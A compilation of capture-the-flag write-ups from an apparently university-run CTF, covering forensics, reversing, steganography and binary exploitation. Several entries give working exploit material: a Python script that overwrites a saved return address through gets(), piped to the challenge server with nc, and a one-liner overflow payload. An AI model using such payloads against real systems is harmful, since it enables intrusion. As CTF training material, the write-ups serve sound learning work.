Dump of assembler code for function process_order:
   0x080486a8 <+0>: push   %ebp
   0x080486a9 <+1>: mov    %esp,%ebp
   0x080486ab <+3>: push   %ebx
   0x080486ac <+4>: sub    $0x74,%esp
   0x080486af <+7>: call   0x8048560 <__x86.get_pc_thunk.bx>
   0x080486b4 <+12>:    add    $0x194c,%ebx
   0x080486ba <+18>:    movl   $0x0,-0xc(%ebp)
   0x080486c1 <+25>:    mov    0x8(%ebp),%eax
   0x080486c4 <+28>:    sub    $0x1,%eax
   0x080486c7 <+31>:    mov    0x3c(%ebx,%eax,4),%eax
   0x080486ce <+38>:    sub    $0x8,%esp
   0x080486d1 <+41>:    push   %eax
   0x080486d2 <+42>:    lea    -0x15a3(%ebx),%eax
   0x080486d8 <+48>:    push   %eax
   0x080486d9 <+49>:    call   0x8048460 <printf@plt>
   0x080486de <+54>:    add    $0x10,%esp
   0x080486e1 <+57>:    sub    $0xc,%esp
   0x080486e4 <+60>:    lea    -0x158b(%ebx),%eax
   0x080486ea <+66>:    push   %eax
   0x080486eb <+67>:    call   0x8048460 <printf@plt>
   0x080486f0 <+72>:    add    $0x10,%esp
   0x080486f3 <+75>:    sub    $0xc,%esp
   0x080486f6 <+78>:    lea    -0x70(%ebp),%eax
   0x080486f9 <+81>:    push   %eax
   0x080486fa <+82>:    call   0x8048470 <gets@plt>
   0x080486ff <+87>:    add    $0x10,%esp
   0x08048702 <+90>:    sub    $0xc,%esp
   0x08048705 <+93>:    lea    -0x1572(%ebx),%eax
   0x0804870b <+99>:    push   %eax
   0x0804870c <+100>:   call   0x80484a0 <puts@plt>
   0x08048711 <+105>:   add    $0x10,%esp
   0x08048714 <+108>:   sub    $0xc,%esp
   0x08048717 <+111>:   push   $0x5
   0x08048719 <+113>:   call   0x8048490 <sleep@plt>
   0x0804871e <+118>:   add    $0x10,%esp
   0x08048721 <+121>:   sub    $0xc,%esp
   0x08048724 <+124>:   lea    -0x1564(%ebx),%eax
   0x0804872a <+130>:   push   %eax
   0x0804872b <+131>:   call   0x80484a0 <puts@plt>
   0x08048730 <+136>:   add    $0x10,%esp
   0x08048733 <+139>:   nop
   0x08048734 <+140>:   mov    -0x4(%ebp),%ebx
   0x08048737 <+143>:   leave
   0x08048738 <+144>:   ret
End of assembler dump.
```

Our main point of interest is the call to `gets()`:
```gdb
 0x080486f6 <+78>:    lea    -0x70(%ebp),%eax
 0x080486f9 <+81>:    push   %eax
 0x080486fa <+82>:    call   0x8048470 <gets@plt>
```

Here we can see that we compute the address of `%ebp - 0x70` and store it in
`%eax`. Next we push `%eax` to the stack. In short, we are passing that
computed address to `gets()`. This means that this address is the start address
of `address[]`.

Set a breakpoint at the call to `gets()`:
```gdb
(gdb) break *0x080486fa
Breakpoint 1 at 0x80486fa
```

Run the program. When the breakpoint is reached, run `info frame`:
```gdb
(gdb) info frame
Stack level 0, frame at 0xffffc170:
 eip = 0x80486fa in process_order; saved eip = 0x8048893
 called by frame at 0xffffc2b0
 Arglist at 0xffffc168, args:
 Locals at 0xffffc168, Previous frame's sp is 0xffffc170
 Saved registers:
  ebx at 0xffffc164, ebp at 0xffffc168, eip at 0xffffc16c
```

We can see that:
- The saved `%ebp` is at `0xffffc168` on the stack
  (it happens that the current `%ebp` always points to the value of the saved
  `%ebp`), because that was the last thing pushed to the stack before the
  function was called.
- The saved `%eip` is at `0xffffc16c` on the stack

Alternatively:
- `x $ebp` shows the value in the `%ebp` register (as well as value of the
  memory that it references)
- `x $ebp+4` shows the return address (old EIP) of the current function, because it was
  the second to last thing pushed to the stack before the function was called.
- See https://www.cs.princeton.edu/courses/archive/spring11/cos217/lectures/15AssemblyFunctions.pdf

We want to overwrite `0xffffc16c`. To do this, we have to fill all the values
between the address of `address[]` and `0xffffc16c`. Then we can set the value
at `0xffffc16c` to whatever we want, namely the address of `print_spy_instructions()`.

We can put all this into a Python script:

```python
def addr_little_endian(addr, n_bytes):
    """`to_bytes(4, byteorder='little')` was buggy for some reason"""
    mask = 0xff
    ans = []
    for i in range(n_bytes):
        x = addr & mask
        for j in range(i):
            x = x >> 8

        ans.append(x.to_bytes(1, byteorder='big'))
        mask = mask << 8

    return ans


def main():
    # Answer `1` at the first prompt
    with open('access', 'w') as f:
        f.write("1\n")

    with open('access', 'ab') as f:
        ebp = 0xffffc168
        buf_addr = ebp - 0x70  # 0x080486fa
        eip = 0xffffc16c

        n_fill = eip - buf_addr

        # Overflow buffer and smash the stack
        for i in range(n_fill):
            f.write(b'\xff')

        # Set return address
        addr = 0x08048626
        for b in addr_little_endian(addr, 4):
            f.write(b)


main()
```

To use this:
```bash
python3 main.py
cat access - | nc pwn.osucyber.club 13374
# Hit enter at the first prompt
```

We can then see that the flag is:
`osuctf{1ll_r3turn_wher3_i_w4nt_2}`


-----

Challenge: cord-great_white
Write-Up Author: ctf-user-006
## cord-great_white

You can open this file in Wireshark, which will show a bunch of packets. We have some HTTP packets, so after some googling around, I realized that you could do `File -> Export Exports -> HTTP`, which would allow you export several files including `flag.png` to a separate folder. Opening `flag.png` shows an image with this text: `osuctf{p4ck3ts_4r3_c00L}`

-----

Challenge: debugger
Write-Up Author: ctf-user-006
## debugger

After looking at the source code, it looks like the ideal place to set a breakpoint would be on the `memset` call. We can open up `pwn` in gdb:
```gdb
(gdb) disassemble main
Dump of assembler code for function main:
   0x0000000000400577 <+0>: push   %rbp
   0x0000000000400578 <+1>: mov    %rsp,%rbp
...
   0x0000000000400644 <+205>:   mov    %rax,%rdi
   0x0000000000400647 <+208>:   callq  0x400480 <memset@plt>
   0x000000000040064c <+213>:   lea    0xe0(%rip),%rdi        # 0x400733
End of assembler dump.
```

We can set a breakpoint at the `memset` call like so:
```gdb
(gdb) break *0x0000000000400647
Breakpoint 1 at 0x400647: file pwn.c, line 11.
```

Then we can `run` the program. To see the flag, we can do `print decrypted_flag` which gives us `osuctf{brutus_l0ves_br3akpoints}`

-----

Challenge: Fontana
Write-Up Author: ctf-user-099
1. Google "fontana ohio state"
2. it is a building and we have a timestamp -> prob webcamera
3. found https://www.teleport.io/feed/d0b8xiqj1ib9sfa7ptyi and it is broken
4. rev api, get the frameframeframeframeframe


-----

Challenge: Matrix Multiplication
Write-Up Author: ctf-user-099
The idea is to send an identity matrix and a matrix we'll modify. I'm not sure what computations ended up happening on the matrix, my process was: send a large matrix, one of them the identity in case the result of the multiplication overflows, then figure out what's going on in gdb.

There was some weird thing going on which required me to subtract some number from the overflowed values, but I'm not sure why.

[ solve script removed -Andrew]

-----

Challenge: Recently Watched
Write-Up Author: ctf-user-006
## Recently Watched

First place to check was the `History` database file in the chrome config folder:

```
sqlite> SELECT * FROM urls;
1|https://www.youtube.com/watch?v=dQw4w9WgXcQ|Rick Astley - Never Gonna Give You Up (Video) - YouTube|1|1|13247388071823408|0
```

Ok, not nice. Looks like we have to try some other stuff. The next thing I tried was [hindsight](https://github.com/obsidianforensics/hindsight), which gave me some more info.

```
cookie (created)  2020-10-16 23:00:35.129 .youtube.com/ GPS <encrypted>
cookie (created)  2020-10-16 23:00:35.130 .youtube.com/ VISITOR_INFO1_LIVE  <encrypted>
cookie (created)  2020-10-16 23:00:37.160 accounts.google.com/  __Host-GAPS <encrypted>
cookie (created)  2020-10-16 23:00:37.612 .doubleclick.net/ IDE <encrypted>
cookie (created)  2020-10-16 23:01:02.774 .google.com/  NID <encrypted>
url 2020-10-16 23:01:11.823 https://www.youtube.com/watch?v=dQw4w9WgXcQ Rick Astley - Never Gonna Give You Up (Video) - YouTube 
preference  2020-10-16 23:01:24.412 https://www.youtube.com:443,* site_engagement [in Preferences.profile.content_settings.exceptions]  {'last_modified': '13247388084412754', 'setting': {'lastEngagementTime': 1.324738808441271e+16, 'lastShortcutLaunchTime': 0.0, 'pointsAddedToday': 3.12, 'rawScore': 3.12}}
preference  2020-10-16 23:01:25.799 https://www.youtube.com:443,* media_engagement [in Preferences.profile.content_settings.exceptions] {'last_modified': '13247388085799130', 'setting': {'audiblePlaybacks': 1, 'audioContextPlaybacks': 0, 'hasHighScore': False, 'highScoreChanges': 0, 'lastMediaPlaybackTime': 1.324738808141319e+16, 'mediaElementPlaybacks': 1, 'mediaPlaybacks': 1, 'significantPlaybacks': 1, 'visits': 1}}
```

Looks like we had some cookies with encrypted values. I spent forever trying to decrypt them using [pycookiecheat](https://github.com/n8henrie/pycookiecheat/) but I couldn't get it to work.

Finally I decided to use the sketchy, closed-source, Windows-only [ChromeCacheViewer](https://www.nirsoft.net/utils/chrome_cache_view.html). After opening it up and going through the entries, I noticed another URL I hadn't seen before: https://www.youtube.com/watch?v=IAKxlSplp-c.

Going to comments section and sorting by newest, I found a suspicious comment by Andrew H: `osuctf{maybe_i_can_just_wipe_it_off}`

-----

Challenge: cord-great_white
Write-Up Author: ctf-user-053
# Finding the Great White
The first step is to run the tool through wireshark. This gives you the packets that have been captured. Wireshark gives you strings it finds as output. With this you see there is an html file with a png in it that is called flag. If you export as http, you can get the html sent over, including the actual flag image.

-----

Challenge: Overflow
Write-Up Author: ctf-user-137
Overflow Writeup
I saw the overflow in the source, so I just sent 0xcafebabe twenty times with 
`(python2 -c 'import struct; print struct.pack("<I", 0xcafebabe)*20'; cat -) | ./overflow`

-----

Challenge: Logo
Write-Up Author: ctf-user-053
# Find the contrast
There are a couple options for how to solve this problem. I originally uploaded the image to [StegOnline](https://stegonline.georgeom.net/upload). Then I used their color options to modify the image. LSB Half ended up being the right one that showed the hidden flag message in the photo.

Another way to solve this is to use an image editor like gimp to modify the brightness and contrast. You want to get them in the opposite directions, so experimenting with that I found low brightness/high contrast showed the hidden message too.

-----

Challenge: PATCHrick_Star
Write-Up Author: ctf-user-017
So for this problem we were given a binary file. Running it through the file command lets us know it's an executable, and when we execute it in linux, it can't open the patrick1.txt and patrick2.txt files. I create those files, put "lol" in them, and the program runs normally, and prints an endless stream of spongebob "quotes". Opening the file in ghidra, I see where it decrypts and prints the flag. It won't get there though because its stuck in an infinite while loop printing spongebob quotes, so I just patched out the jump instruction that represented the while loop to a NOP instruction using ghidra's patch instruction function. I save the program, run it again, and get a little farther, but still get stuck after printing patrick2.txt. The decrypt_flag function, right above the printf that prints the flag, was locking up and waiting forever. I patched out the conditional that checks the time, and the nanosleep function call with nops, and it printed out the flag successfully.

-----

Challenge: my_favorite_shape
Write-Up Author: ctf-user-028
# Strap in for this one, kids!

After downloading and viewing the output.log file included for this problem, the first step in solving this one was obviously to google what RSSI values are. Because come on, who knows this off the top of their head unless they work in wireless networking? (NOTE: I see this has now been changed to "received power" levels. Understandable, as RSSI values are usually measured in decibels, whereas the values given seem to be proportions.) After learning that these measured the strength of the signal received at each station, I set about making a mathematical model of this situation.

So the one piece of outside info that is absolutely essential to this problem is the inverse square law. The power received at any one station is proportional to 1/(r^2 ), where r is the distance from the station to the point where the signal originated. This law is basically universal among wireless signals. 

Since we're using an x-y coordinate system, r^2 = x^2 + y^2. Now we're getting somewhere. The power received at the first station at (0,0) should be proportional to 1/(x^2 + y^2 ). The power received at the station at (150, 400) should be proportional to 1/((x-150)^2 + (y-400)^2 ). And lastly, the power received at the third station at (300, 0) should be proportional to 1/((x-300)^2 + y^2 ). x and y, by the way, are the x and y coordinates where the signal originated. 

We also have the power level at three stations, which I called a, b, and c. Now this next assumption may not be quite as the puzzle designer intended, but I interpreted the values given as proportions. In other words, for some broadcast strength *e*, the power reading at the first station would be equal to a\**e*, and would be equal to *e*/(x^2 + y^2 ). So I divided it out of all three equations, and got the following:

* a = 1/(x^2 + y^2 )
* b = 1/((x-150)^2 + (y-400)^2 )
* c = 1/((x-300)^2 + y^2 )

And then all that was left to do was solve that system of equations... oh *joy*...

I won't go into too much detail, but that was pages worth of math. Still, it got me a final result of 

* y = (1/a + 1/c - 2/b + 275000)/1600
* x = (1/a - 1/b) + 182500 - 800\*y

And that was enough to start scripting. I wrote a Python script that took in the output.log file and, for each set of three station values, calculated these x and y coordinates. There were also values where a, b, c were all equal to 0, so I had it print "no signal" during those times. And then, knowing that I needed to plot these somehow, I installed the [matplotlib](https://matplotlib.org/) module and used its [Pyplot](https://matplotlib.org/tutorials/introductory/pyplot.html) construct to make and display a plot. This led to a scatterplot that looked like just a bunch of points. Ok, a bit disheartening, but still, we have a plot.

I realized that I needed to get some lines drawn on this. I had a suspicion, so I opened up GIMP and played "connect the dots" with the first five coordinates. That's when it clicked: every set of points traced out a letter, followed by a period of "no signal." So I moved the plot function inside my loop; if a,b, and c were equal to 0, then the program would spit out a plot with lines and wait for me to close it before continuing. This allowed me to go through each letter, writing it down by hand as the code ran through each set of points. And that was the flag! 

(Author's note: this is what got me the final solution. Not shown here are even more pages of math where I tried a different - and wrong - model, as well as all the minor issues that came up in using a less familiar language. I'm not quite used to Python yet.)

-----

Challenge: onion
Write-Up Author: ctf-user-115
Basically just set a breakpoint before we execute the code after it gets transformed in the binary and do:
`> x/2000s code` to dump out the code. Formatting is pretty easy if you're a vim user. If not...rip.

Anyway then we can just do this:
```python

import zlib, base64, bz2, lzma

x = '''zlib.decompress(base64.b64decode('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